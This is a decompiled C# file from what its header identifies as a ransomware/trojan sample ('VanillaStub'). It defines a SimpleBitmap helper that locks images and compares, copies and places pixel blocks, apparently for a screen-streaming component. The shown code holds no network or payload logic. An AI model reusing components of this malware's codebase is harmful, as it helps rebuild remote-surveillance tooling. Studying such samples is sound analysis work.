// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.StreamLibrary.src.SimpleBitmap
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;

namespace VanillaStub.Helpers.Services.StreamLibrary.src
{
  public class SimpleBitmap
  {
    private readonly object ProcessingLock = new object();

    public SimpleBitmap()
    {
      this.Scan0 = IntPtr.Zero;
      this.bitmapData = (BitmapData) null;
      this.bitMap = (Bitmap) null;
      this.Info = new SimpleBitmap.SimpleBitmapInfo();
    }

    public SimpleBitmap(Bitmap bmp) => this.bitMap = bmp;

    public SimpleBitmap.SimpleBitmapInfo Info { get; internal set; }

    public bool Locked => !(this.Scan0 == IntPtr.Zero);

    public IntPtr Scan0 { get; internal set; }

    public int Scan0_int { get; internal set; }

    public BitmapData bitmapData { get; internal set; }

    public Bitmap bitMap { get; set; }

    public static unsafe bool Compare(
      Rectangle block,
      int ptr1,
      int ptr2,
      SimpleBitmap.SimpleBitmapInfo sharedInfo)
    {
      int count = block.Width * sharedInfo.PixelSize;
      int num = block.Y * sharedInfo.Stride + block.X * sharedInfo.PixelSize;
      for (int index = 0; index < block.Height; ++index)
      {
        if (NativeMethods.memcmp((byte*) (ptr1 + num), (byte*) (ptr2 + num), (uint) count) != 0)
          return false;
        num += sharedInfo.Stride;
      }
      return true;
    }

    public static unsafe bool Compare(
      int y,
      int rowsize,
      int ptr1,
      int ptr2,
      SimpleBitmap.SimpleBitmapInfo sharedInfo)
    {
      int count = sharedInfo.Width * sharedInfo.PixelSize * rowsize;
      int num = y * sharedInfo.Stride;
      return NativeMethods.memcmp((byte*) (ptr1 + num), (byte*) (ptr2 + num), (uint) count) == 0;
    }

    public static unsafe bool FastCompare(
      int offset,
      int size,
      int ptr1,
      int ptr2,
      SimpleBitmap.SimpleBitmapInfo sharedInfo)
    {
      return NativeMethods.memcmp((byte*) (ptr1 + offset), (byte*) (ptr2 + offset), (uint) size) == 0;
    }

    public unsafe void CopyBlock(Rectangle block, ref byte[] dest)
    {
      int count = block.Width * this.Info.PixelSize;
      int num1 = 0;
      int int32 = this.Scan0.ToInt32();
      int length = count * block.Height;
      if (dest == null || dest.Length != length)
        dest = new byte[length];
      int num2 = block.Y * this.Info.Stride + block.X * this.Info.PixelSize;
      fixed (byte* numPtr = dest)
      {
        for (int index = 0; index < block.Height; ++index)
        {
          NativeMethods.memcpy(new IntPtr((void*) (numPtr + num1)), new IntPtr(int32 + num2), (uint) count);
          num2 += this.Info.Stride;
          num1 += count;
        }
      }
    }

    public void Lock()
    {
      if (this.Locked)
        throw new Exception("Already locked");
      lock (this.ProcessingLock)
      {
        this.bitmapData = this.bitMap.LockBits(new Rectangle(0, 0, this.bitMap.Width, this.bitMap.Height), ImageLockMode.ReadWrite, this.bitMap.PixelFormat);
        this.Info = new SimpleBitmap.SimpleBitmapInfo(this.bitmapData);
        this.Scan0 = this.bitmapData.Scan0;
        this.Scan0_int = this.Scan0.ToInt32();
      }
    }

    public void Unlock()
    {
      if (!this.Locked)
        throw new Exception("Nothing to unlock");
      lock (this.ProcessingLock)
      {
        this.Scan0 = IntPtr.Zero;
        this.Scan0_int = 0;
        this.Info.Clear();
        this.bitMap.UnlockBits(this.bitmapData);
        this.bitmapData = (BitmapData) null;
      }
    }

    public unsafe void PlaceBlockAtRectange(byte[] block, Rectangle loc)
    {
      int count = this.Info.PixelSize * loc.Width;
      int num1 = loc.X * this.Info.PixelSize;
      int num2 = 0;
      fixed (byte* numPtr = block)
      {
        for (int index = 0; index < loc.Height; ++index)
        {
          NativeMethods.memcpy(new IntPtr(this.Scan0_int + (loc.Y + index) * this.Info.Stride + num1), new IntPtr((void*) (numPtr + num2)), (uint) count);
          num2 += count;
        }
      }
    }

    public void Dispose(bool disposeBitmap = false)
    {
      if (this.Locked)
        this.Unlock();
      if (disposeBitmap)
        this.bitMap.Dispose();
      this.bitMap = (Bitmap) null;
    }

    public class SimpleBitmapInfo
    {
      public SimpleBitmapInfo() => this.Clear();

      public SimpleBitmapInfo(BitmapData data) => this.Load(data);

      public int Stride { get; protected set; }

      public int PixelSize { get; protected set; }

      public int Width { get; protected set; }

      public int Height { get; protected set; }

      public int TotalSize { get; protected set; }

      internal void Clear()
      {
        this.Stride = 0;
        this.PixelSize = 0;
        this.Width = 0;
        this.Height = 0;
        this.TotalSize = 0;
      }

      internal void Load(BitmapData data)
      {
        this.Width = data.Width;
        this.Height = data.Height;
        this.Stride = data.Stride;
        this.PixelSize = Math.Abs(data.Stride) / data.Width;
        this.TotalSize = data.Width * data.Height * this.PixelSize;
      }
    }
  }
}
